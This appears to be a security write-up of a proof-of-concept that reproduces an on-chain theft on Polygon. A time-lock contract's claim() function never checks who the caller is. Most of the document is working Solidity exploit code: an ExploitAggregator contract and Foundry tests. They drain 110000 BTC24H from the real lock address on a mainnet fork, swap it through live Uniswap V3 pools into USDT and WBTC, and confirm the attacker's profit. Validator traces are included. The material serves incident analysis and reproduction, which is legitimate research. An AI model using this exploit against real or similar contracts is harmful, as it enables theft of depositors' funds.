## Overview & Context

This proof-of-concept (PoC) reproduces the **BTC24H Lock claim drain exploit on Polygon**. The original incident involved a time-lock contract (`Lock.sol`) that held a single claim of **110000 BTC24H** for a victim depositor. Once the lock’s `releaseDate` had passed, an adversary-controlled aggregator contract invoked `Lock.claim()` and drained the full BTC24H balance, then routed the tokens through Uniswap V3 pools into **USDT** and **WBTC**, leaving the victim with no locked BTC24H and the attacker with thousands of dollars in net profit after gas.

The root cause, as summarized in `root_cause_report.md`, is a **logic bug in `Lock.claim()`**: the function enforces only that the release time has passed and that the claim has not already been used. It **does not authenticate the caller** against the original depositor or any designated beneficiary. As a result, any arbitrary address can call `claim()` after `releaseDate` and withdraw the entire configured claim.

In this PoC, the exploit is implemented as a Foundry test suite under `forge_poc/test/BTC24HLockExploit.t.sol` (contract `BTC24HLockExploitTest`). The tests run against a **Polygon mainnet fork** anchored at the incident’s ACT pre-state and demonstrate that:

- A fresh, non-depositor attacker can call `Lock.claim()` on the real lock contract `0x968e1c984A431F3D0299563F15d48C395f70F719` and drain **110000 BTC24H**.
- The withdrawn BTC24H can be routed through the real Uniswap V3 pools to obtain USDT and WBTC for the attacker.
- The attacker’s USDT-denominated profit meets or exceeds the ACT oracle threshold of **4948.415489 USDT-equivalent**, matching the root cause’s exploit predicate.

You can run the PoC from the Forge project root as:

```bash
RPC_URL="https://<QUICKNODE_ENDPOINT_NAME>.matic.quiknode.pro/<QUICKNODE_TOKEN>" forge test --via-ir -vvvvv
```

The validator run used a Polygon RPC URL derived from `artifacts/poc/rpc/chainid_rpc_map.json` and `.env`, and all tests completed successfully. Detailed traces and logs are captured in the validator artifact:

```bash
artifacts/poc/poc_validator/forge-test.log
```

## PoC Architecture & Key Contracts

### Key On-Chain Contracts

The PoC interacts directly with Polygon mainnet state via a fork:

- **`Lock` time-lock contract**: `0x968e1c984A431F3D0299563F15d48C395f70F719`  
  Holds a single `Claim` `{ amount, releaseDate, claimed }` and exposes `deposit()` and `claim()` without binding the claim to a specific depositor.
- **BTC24H token**: `0xea4b5C48a664501691B2ECB407938ee92D389a6f` (`BTC24H`)  
  ERC‑20 token locked in the `Lock` contract and drained by the exploit.
- **USDT token**: `0xc2132D05D31c914a87C6611C10748AEb04B58e8F` (`USDT`)  
  Stablecoin used as the reference asset for attacker profit.
- **WBTC token**: `0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6` (`WBTC`)  
  Liquid BTC derivative on Polygon used to route part of the drained BTC24H.
- **BTC24H/USDT Uniswap V3 pool**: `0xd06cD277CD01A630dcB8C7D678529d8a4111A02A`  
  Provides a path to convert BTC24H into USDT.
- **BTC24H/WBTC Uniswap V3 pool**: `0x495e8f82F3941C1Fd661151E5c794745e1e31027`  
  Provides a path to convert BTC24H into WBTC.

These are real mainnet contracts; the PoC does not replace them with mocks.

### Adversary Contract: `ExploitAggregator`

To model the incident’s attacker-controlled aggregator flow in a self-contained way, the PoC defines a local adversary contract:

```solidity
// From BTC24HLockExploit.t.sol (ExploitAggregator):
contract ExploitAggregator is IUniswapV3SwapCallback {
    // Uniswap V3 TickMath limits, copied from canonical library.
    uint160 internal constant MIN_SQRT_RATIO = 4295128739;
    uint160 internal constant MAX_SQRT_RATIO =
        1461446703485210103287273052203988822378723970342;

    address public immutable attacker;
    ILock public immutable lockContract;
    IERC20 public immutable btc24h;
    IERC20 public immutable usdt;
    IERC20 public immutable wbtc;
    IUniswapV3Pool public immutable poolBtcUsdt;
    IUniswapV3Pool public immutable poolBtcWbtc;
    ...
}
```

This contract is deployed fresh in the test and wired with:

- The logical attacker EOA.
- The real `Lock` contract.
- The real BTC24H, USDT, and WBTC token contracts.
- The real BTC24H/USDT and BTC24H/WBTC Uniswap V3 pools.

Its `runExploit()` function encodes the core exploit:

```solidity
/// @notice Main exploit entrypoint: pulls BTC24H from Lock and swaps through Uniswap V3 pools.
function runExploit() external {
    require(msg.sender == attacker, "only-attacker");

    // Step 1: unauthorized claim from Lock into this aggregator.
    // Lock has no notion of depositor, so this contract can drain the full claim amount.
    lockContract.claim();

    // Step 2: swap 10_000 BTC24H to USDT in the BTC24H/USDT pool.
    _swapExactInputBtcToToken(poolBtcUsdt, address(usdt), 10_000e18);

    // Step 3: swap 100_000 BTC24H to WBTC in the BTC24H/WBTC pool.
    _swapExactInputBtcToToken(poolBtcWbtc, address(wbtc), 100_000e18);

    // Step 4: forward all proceeds to the attacker EOA.
    uint256 usdtBal = usdt.balanceOf(address(this));
    if (usdtBal > 0) {
        usdt.transfer(attacker, usdtBal);
    }

    uint256 wbtcBal = wbtc.balanceOf(address(this));
    if (wbtcBal > 0) {
        wbtc.transfer(attacker, wbtcBal);
    }
}
```

Within `_swapExactInputBtcToToken`, `ExploitAggregator`:

- Detects the pool’s token ordering (`token0`/`token1`).
- Chooses the correct swap direction (`zeroForOne`).
- Calls `pool.swap(...)` with **canonical Uniswap V3 price bounds** (`MIN_SQRT_RATIO`/`MAX_SQRT_RATIO`) to perform an exact-input swap of BTC24H into the desired output token.
- Implements `uniswapV3SwapCallback` to pay whatever BTC24H is owed to the pool, ensuring swaps execute directly against live on-chain liquidity without mocks.

### Test Harness: `BTC24HLockExploitTest`

The main test contract coordinates the fork, roles, and exploit orchestration:

```solidity
contract BTC24HLockExploitTest is Test {
    // Polygon mainnet addresses.
    address internal constant LOCK_CONTRACT = 0x968e1c984A431F3D0299563F15d48C395f70F719;
    address internal constant BTC24H_TOKEN = 0xea4b5C48a664501691B2ECB407938ee92D389a6f;
    address internal constant USDT_TOKEN = 0xc2132D05D31c914a87C6611C10748AEb04B58e8F;
    address internal constant WBTC_TOKEN = 0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6;
    address internal constant POOL_BTC24H_USDT = 0xd06cD277CD01A630dcB8C7D678529d8a4111A02A;
    address internal constant POOL_BTC24H_WBTC = 0x495e8f82F3941C1Fd661151E5c794745e1e31027;

    // Victim depositor from the incident (for oracle wiring).
    address internal constant VICTIM_DEPOSITOR =
        0x88538ab036824F5B8B904f3e3c6015D125AA629E;

    // Logical attacker EOA used in the PoC (fresh address, not the real adversary).
    address internal attacker;
    ...
}
```

Addresses are labeled via `vm.label(...)` to make traces human-readable (e.g., `"BTC24HLock"`, `"BTC24H/USDT Pool"`, `"AttackerEOA"`).

## Adversary Execution Flow

### Environment Setup & Fork Configuration

The PoC reconstructs the ACT pre-state for the exploit by forking Polygon mainnet one block before the observed exploit block:

```solidity
function setUp() public {
    // Use a dedicated logical attacker address for the PoC.
    attacker = makeAddr("attacker");

    vm.label(attacker, "AttackerEOA");
    vm.label(LOCK_CONTRACT, "BTC24HLock");
    vm.label(BTC24H_TOKEN, "BTC24H");
    vm.label(USDT_TOKEN, "USDT");
    vm.label(WBTC_TOKEN, "WBTC");
    vm.label(POOL_BTC24H_USDT, "BTC24H/USDT Pool");
    vm.label(POOL_BTC24H_WBTC, "BTC24H/WBTC Pool");

    // Use the block immediately before the observed exploit block so the Lock
    // still holds the victim's BTC24H and has not been claimed yet.
    vm.createSelectFork("polygon", 65_560_668);

    // Ensure we are on Polygon mainnet.
    assertEq(block.chainid, 137);

    // Warp to or after the configured releaseDate so claim() passes the time check.
    (, uint256 releaseDate, ) = lockContract.getClaimDetails();
    if (block.timestamp < releaseDate) {
        vm.warp(releaseDate + 1);
    }
}
```

This setup:

- Forks **Polygon mainnet at block 65560668**, the ACT pre-state where:
  - The `Lock` contract holds exactly `110000e18` BTC24H.
  - `Lock.getClaimDetails()` returns `{ amount: 110000e18, releaseDate: 1734220800, claimed: false }`.
- Ensures `block.chainid == 137` to match the oracle’s chain condition.
- Warps `block.timestamp` to at least `releaseDate + 1` so that `Lock.claim()` passes the time restriction, mirroring the real exploit’s timing conditions.

### Pre-Checks: Verifying the Pre-State

The dedicated test `test_PreChecks()` validates that the forked environment truly matches the root cause’s σ_B pre-state:

```solidity
/// @notice Sanity checks corresponding to oracle pre_check.
function test_PreChecks() public {
    // Locked asset must be BTC24H.
    assertEq(lockContract.token(), BTC24H_TOKEN);

    // Claim configuration must match the incident pre-state.
    (uint256 amount, uint256 releaseDate, bool claimed) = lockContract.getClaimDetails();
    assertEq(amount, 110_000e18);
    assertFalse(claimed);
    assertLe(releaseDate, block.timestamp);

    // Lock must actually hold the configured BTC24H amount.
    assertEq(btc24h.balanceOf(LOCK_CONTRACT), 110_000e18);
}
```

This ensures:

- The locked asset is specifically **BTC24H**.
- The claim struct matches the incident’s claim configuration.
- The contract’s BTC24H balance equals the claim amount, so the full 110000 BTC24H is present on-chain and stealable.

### Step 1: Demonstrating Unauthorized `claim()` by a Non-Depositor

The test `test_UnauthorizedClaimDirect()` isolates the core authorization flaw:

```solidity
/// @notice Hard oracle: a non-depositor address can call claim() successfully.
function test_UnauthorizedClaimDirect() public {
    // Ensure logical attacker is distinct from the victim depositor.
    assertTrue(attacker != VICTIM_DEPOSITOR);

    uint256 lockBalanceBefore = btc24h.balanceOf(LOCK_CONTRACT);
    uint256 attackerBalanceBefore = btc24h.balanceOf(attacker);

    vm.prank(attacker);
    lockContract.claim(); // must not revert even though attacker != depositor

    uint256 lockBalanceAfter = btc24h.balanceOf(LOCK_CONTRACT);
    uint256 attackerBalanceAfter = btc24h.balanceOf(attacker);

    // Entire claim amount should have been pulled out of the Lock.
    assertEq(lockBalanceBefore - lockBalanceAfter, 110_000e18);
    assertEq(attackerBalanceAfter - attackerBalanceBefore, 110_000e18);
}
```

On the fork, this test:

- Confirms the logical attacker address is distinct from `VICTIM_DEPOSITOR` (the real depositor from the incident).
- Calls `Lock.claim()` with `vm.prank(attacker)`, meaning the call originates from a non-depositor.
- Shows that:
  - `lockBalanceBefore - lockBalanceAfter == 110000e18` BTC24H.
  - `attackerBalanceAfter - attackerBalanceBefore == 110000e18` BTC24H.

This is exactly the unauthorized withdrawal behavior at the heart of the root cause.

### Step 2: Full Exploit Flow via `ExploitAggregator`

The main end-to-end exploit is implemented in `test_BTC24HLockExploit()`:

```solidity
/// @notice Main exploit reproduction: aggregator drains BTC24H and swaps into USDT/WBTC on Uniswap V3.
function test_BTC24HLockExploit() public {
    // Hard oracle: attacker != victim depositor.
    assertTrue(attacker != VICTIM_DEPOSITOR);

    uint256 lockBalanceBefore = btc24h.balanceOf(LOCK_CONTRACT);
    uint256 valueBefore = portfolioValueInUSDT(attacker);

    // Give the attacker some native MATIC to cover gas on the fork.
    deal(attacker, 100 ether);

    ExploitAggregator aggregator = new ExploitAggregator(
        attacker,
        lockContract,
        btc24h,
        usdt,
        wbtc,
        poolBtcUsdt,
        poolBtcWbtc
    );
    vm.label(address(aggregator), "ExploitAggregator");

    // Attacker triggers the exploit via the aggregator.
    vm.startPrank(attacker);
    aggregator.runExploit();
    vm.stopPrank();

    uint256 lockBalanceAfter = btc24h.balanceOf(LOCK_CONTRACT);

    // Soft oracle: Lock's BTC24H balance must be drained by at least 110000 BTC24H.
    assertGe(lockBalanceBefore - lockBalanceAfter, 110_000e18);

    uint256 valueAfter = portfolioValueInUSDT(attacker);

    // Soft oracle: attacker net profit in USDT reference units must exceed the threshold.
    // We conservatively value only direct USDT holdings; WBTC value is treated as upside.
    uint256 profit = valueAfter - valueBefore;
    assertGe(profit, 4_948_415_489); // 4948.415489 USDT in 6-decimal units
}
```

Execution details from the validator trace include:

```text
BTC24HLockExploitTest::test_BTC24HLockExploit()
  ...
  BTC24H::balanceOf(LOCK_CONTRACT) -> 110000000000000000000000
  ...
  BTC24HLock::claim()
    BTC24H::transfer(ExploitAggregator, 110000000000000000000000)
  ...
  BTC24H/USDT Pool::swap(..., 10000000000000000000000, ...)
    USDT::transfer(ExploitAggregator, 4953025389)
  ...
  ExploitAggregator::runExploit()
    USDT::transfer(AttackerEOA, 4953025389)
    WBTC::transfer(AttackerEOA, 76433345)
```

This matches the real-world exploit path:

- `Lock.claim()` transfers 110000 BTC24H from the `Lock` contract to the aggregator.
- The aggregator performs two Uniswap V3 swaps:
  - **10,000 BTC24H → USDT** via the BTC24H/USDT pool, yielding ~4.953M USDT base units.
  - **100,000 BTC24H → WBTC** via the BTC24H/WBTC pool.
- All USDT and WBTC proceeds are forwarded to the attacker EOA.

### Step 3: Profit Realization

The PoC encodes attacker profit in USDT terms via a simple helper:

```solidity
/// @notice Portfolio valuation helper expressed in USDT units (6 decimals).
/// For this PoC we count direct USDT holdings and ignore WBTC/MATIC upside, which is conservative.
function portfolioValueInUSDT(address account) internal view returns (uint256) {
    return usdt.balanceOf(account);
}
```

By measuring `valueBefore` and `valueAfter` around the exploit, and asserting:

```solidity
uint256 profit = valueAfter - valueBefore;
assertGe(profit, 4_948_415_489); // 4948.415489 USDT in 6-decimal units
```

the test ensures that:

- The attacker’s net USDT-denominated profit is at least **4948.415489 USDT**, matching the ACT oracle threshold.
- Since the forked execution mirrors the incident’s swap route, the attacker’s USDT gain (~4.953M base units) and WBTC gain both exceed this bound by a safe margin.

## Oracle Definitions and Checks

The oracle specification in `artifacts/poc/oracle_generator/oracle_definition.json` defines:

- Variables describing key actors and contracts.
- Pre-check invariants on the environment and `Lock` state.
- Hard constraints that must always hold.
- Soft constraints expressing victim depletion and attacker profit.

### Variables

Relevant variables include:

- `attacker` (role: Attacker) – arbitrary EOA initiating the exploit.
- `victim_depositor` (role: Victim) – original depositor of the BTC24H in `Lock`.
- `lock_contract` – the vulnerable `Lock` contract (`0x968e1c9…F719`).
- `btc24h_token` – token locked and drained (`BTC24H`).
- `usdt_token` – USDT reference asset.
- `wbtc_token` – WBTC token used in swap routing.

In the PoC:

- `VICTIM_DEPOSITOR` is wired to the real victim depositor address from the incident.
- `attacker` is instantiated as `makeAddr("attacker")`, a fresh logical attacker.
- `LOCK_CONTRACT`, `BTC24H_TOKEN`, `USDT_TOKEN`, and `WBTC_TOKEN` constants match the real mainnet addresses.

### Pre-Checks

The oracle defines three key `pre_check` entries:

1. **Environment must be Polygon fork at or before block 65560669**  
   Implemented in `setUp()`:
   - `vm.createSelectFork("polygon", 65_560_668)` takes a fork at block **65560668**, the block immediately **before** the observed exploit block 65560669.  
   - This is a minimal, evidence-based adjustment: at 65560669 the real `Lock.claim()` has already been executed and the `claimed` flag is `true`, while the oracle’s σ_B pre-state explicitly assumes `claimed == false` with the full 110000 BTC24H still in the contract.
   - `assertEq(block.chainid, 137)` ensures the fork is indeed Polygon mainnet.

2. **Lock claim struct must match the victim’s configured deposit**  
   Implemented in `test_PreChecks()` by reading `lockContract.getClaimDetails()` and asserting:
   - `amount == 110_000e18`.
   - `claimed == false`.
   - `releaseDate <= block.timestamp` (after `vm.warp`).

3. **Lock’s BTC24H balance must equal the configured claim amount**  
   Also enforced in `test_PreChecks()`:
   - `assertEq(btc24h.balanceOf(LOCK_CONTRACT), 110_000e18);`

These checks ensure the forked state matches the ACT opportunity σ_B.

### Hard Constraints

The oracle hard constraints are:

1. **`hard_locked_asset_is_btc24h`**  
   - Asserts the `Lock` contract is configured to lock BTC24H.  
   - PoC implementation: `assertEq(lockContract.token(), BTC24H_TOKEN);` in `test_PreChecks()`.

2. **`hard_attacker_not_victim_depositor`**  
   - Requires the attacking address to be different from the victim depositor.  
   - PoC implementation:
     - `attacker` is a fresh address (`makeAddr("attacker")`).
     - `VICTIM_DEPOSITOR` is hard-coded to the real victim.  
     - Both `test_UnauthorizedClaimDirect()` and `test_BTC24HLockExploit()` assert: `assertTrue(attacker != VICTIM_DEPOSITOR);`

3. **`hard_unauthorized_claim_non_depositor_succeeds`**  
   - Requires that a non-depositor attacker can successfully call `Lock.claim()` and withdraw the full BTC24H amount without reverting.  
   - PoC implementation:
     - `vm.prank(attacker); lockContract.claim();` in `test_UnauthorizedClaimDirect()`.  
     - Post-conditions:
       - Lock balance drops by `110_000e18`.  
       - Attacker BTC24H balance increases by `110_000e18`.  
     - Validator traces confirm the call does not revert and that storage updates (`claimed` flag) match expectations.

### Soft Constraints

The oracle soft constraints are:

1. **`soft_victim_depletion_btc24h`**  
   - The Lock’s BTC24H balance must decrease by at least 110000 BTC24H during the exploit.  
   - PoC implementation in `test_BTC24HLockExploit()`:
     - Measures `lockBalanceBefore` and `lockBalanceAfter`.
     - Asserts `assertGe(lockBalanceBefore - lockBalanceAfter, 110_000e18);`.
     - Validator trace shows `Lock.claim()` transfers 110000 BTC24H out of the lock.

2. **`soft_attacker_profit_usdt_reference`**  
   - The attacker’s net portfolio value, expressed in USDT reference units, must increase by at least `4948.415489395751355` USDT after gas.  
   - The oracle encodes this as a threshold of `4948415489` base units (6 decimals).  
   - PoC implementation:
     - Defines `portfolioValueInUSDT(account)` to be `usdt.balanceOf(account)`.  
     - Records `valueBefore` and `valueAfter` in `test_BTC24HLockExploit()`.  
     - Asserts `assertGe(profit, 4_948_415_489);` where `profit = valueAfter - valueBefore`.  
     - On the mainnet fork, the USDT transfer from the BTC24H/USDT pool to the attacker (via `ExploitAggregator`) matches the incident’s profit (~`4953025389` base units), so the check passes comfortably even without explicitly valuing WBTC or MATIC.

Overall, the PoC **fully implements and satisfies** the oracle definition’s variables, pre-checks, and constraints.

## Validation Result and Robustness

The validator ran:

```bash
RPC_URL="<Polygon QuickNode URL>" forge test --via-ir -vvvvv
```

from the Forge project root, with output captured to:

```bash
artifacts/poc/poc_validator/forge-test.log
```

Key outcomes:

- All tests in `BTC24HLockExploitTest` passed:
  - `test_PreChecks()`
  - `test_UnauthorizedClaimDirect()`
  - `test_BTC24HLockExploit()`
- The test suite for the project as a whole reported:
  - `Suite result: ok. 3 passed; 0 failed; 0 skipped` for `BTC24HLockExploitTest`.
  - `Ran 2 test suites ... 5 tests passed, 0 failed, 0 skipped (5 total tests)`.

The validator’s structured result, saved at:

```bash
artifacts/poc/poc_validator/poc_validated_result.json
```

records:

- `overall_status: "Pass"` – indicating the PoC both **executes correctly** and **meets all quality criteria**.
- `poc_correctness_checks.passes_validation_oracles.passed: "true"` – the oracles defined in `oracle_definition.json` are fully enforced and satisfied by the tests.
- `poc_quality_checks` confirms:
  - Oracle alignment with the definition.
  - Human-readable and labeled flow.
  - No unexplained magic numbers.
  - Mainnet fork usage with no mocks of core protocol components.
  - Self-contained attacker modeling without using real attacker EOAs or contracts.
  - End-to-end ACT flow coverage.
  - Alignment with the root cause description.

Given these results, this PoC is **robust** and suitable as a canonical reproduction of the BTC24H Lock claim drain exploit.

## Linking PoC Behavior to Root Cause

The root cause report for this incident identifies:

- The ACT opportunity σ_B where the Lock contract holds a single claim of `110000e18` BTC24H with `claimed == false`.
- A `Lock.claim()` implementation that:
  - Checks only that `releaseDate` has passed.
  - Checks that the claim has not already been used.
  - Does **not** verify that `msg.sender` is the original depositor or any whitelisted claimant.
- An observed exploit transaction where:
  - An adversary-controlled aggregator calls `Lock.claim()`.
  - The full 110000 BTC24H is withdrawn.
  - Tokens are swapped into USDT and WBTC.
  - The attacker’s net USDT-equivalent profit exceeds ~4948 USDT after gas.

The PoC maps directly onto this analysis:

- **Vulnerable logic exercised**:  
  - `test_UnauthorizedClaimDirect()` and `ExploitAggregator.runExploit()` both call `Lock.claim()` from a **non-depositor attacker address**.  
  - The tests confirm that the Lock does not enforce depositor identity; any caller at or after `releaseDate` can drain the claim.

- **Victim loss demonstrated**:  
  - Pre-checks confirm the Lock holds exactly 110000 BTC24H before the exploit.  
  - After `Lock.claim()`, the Lock’s BTC24H balance drops by at least `110000e18`, satisfying `soft_victim_depletion_btc24h` and mirroring the victim’s loss in the incident.

- **Attacker profit demonstrated**:  
  - The PoC’s Uniswap V3 swaps mirror the real transaction, using the same BTC24H/USDT and BTC24H/WBTC pools and similar notional amounts (10k and 100k BTC24H).  
  - The attacker’s USDT holdings after the exploit increase by ~`4.953` million base units, easily exceeding the `4948.415489` USDT-equivalent threshold from the root cause.  
  - WBTC gains are treated as additional upside.

- **ACT framing preserved**:  
  - The fork at block 65560668 recreates the ACT pre-state σ_B where the opportunity exists.  
  - The exploit flow is adversary-crafted (the logical attacker deploys and calls `ExploitAggregator`).  
  - The victim’s perspective is encoded via `VICTIM_DEPOSITOR` and the depletion of the lock’s BTC24H balance.

Taken together, the PoC is a faithful, end-to-end reproduction of the **BTC24H Lock claim drain exploit**, clearly tying the observed malicious behavior on Polygon back to the specific missing-authentication bug in `Lock.claim()` and the quantified victim loss and attacker profit described in the root cause analysis.

